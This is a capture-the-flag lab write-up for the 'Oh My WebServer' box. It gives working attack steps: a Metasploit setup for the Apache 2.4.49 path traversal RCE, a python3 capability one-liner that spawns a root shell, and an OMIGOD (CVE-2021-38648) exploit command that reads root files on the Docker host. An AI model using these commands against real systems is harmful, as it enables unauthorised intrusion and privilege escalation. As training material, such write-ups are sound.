# Oh My WebServer

### Oh My WebServer
Nmap scan shows ports 22 and 80 open. Port 80 is an apache web server, version 2.4.49. This version is vulnerable to [path traversal and RCE](https://github.com/blackn0te/Apache-HTTP-Server-2.4.49-2.4.50-Path-Traversal-Remote-Code-Execution).<br />
There's also a metasploit module for this, and I used it to access the machine: <br />

    use multi/http/apache_normalize_path_rce
    set lhost MY_IP
    set rport 80
    set rhosts TARGET_IP
    set ssl false 
    run
Now that I'm on the machine, I used linpeas to enumerate the machine and it finds a capability on python3:<br />
![image](https://github.com/user-attachments/assets/a9e19bce-4d96-45a4-b020-7a9f4ea62491)<br />
There's a very good guide on [here](https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/) on how to exploit this capability.<br />
To summerize, you need to execute: `/usr/bin/python3.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'`:<br />
![image](https://github.com/user-attachments/assets/d5dc1bda-53f5-4ed9-bb04-4dc83de866d2)<br />
Thus, become root! The user.txt file is inside /root:<br />
![image](https://github.com/user-attachments/assets/544be2ca-4d8e-4826-934f-5cb791d6b0ad)<br />
This is where I understood that I'm actually in a docker container. Furthermore: <br />
![image](https://github.com/user-attachments/assets/2ea2ae71-7f37-4785-9961-ea39375eef17)<br />
The address of the machine is `172.17.0.2`. This is typical of a docker container. The default gateway is instead `172.17.0.1`, and it's the address of the host machine that contains the container. After enumerating the machine A LOT, I tried to check if there are any other machines in this IP subnet, maybe the docker container uses `172.17.0.1`, the default gateway, to communicate with the host.
And the ports it finds are: <br />
![image](https://github.com/user-attachments/assets/d548b00d-b93c-413c-8c08-d6e86e04f2ab)<br />
Searching online on how to pentest port 5986 I found [this CVE](https://github.com/CyberMonitor/CVE-2021-38648), that allows for remote code execution.<br />
So I transfer the exploit on the target machine and execute: `python3 out.py -t 172.17.0.1 -c 'whoami;pwd;id;hostname;uname -a;cat /root/root.txt;'`
![image](https://github.com/user-attachments/assets/d0acf199-3a8e-482e-a5f5-e6b88ecd5eeb)<br />



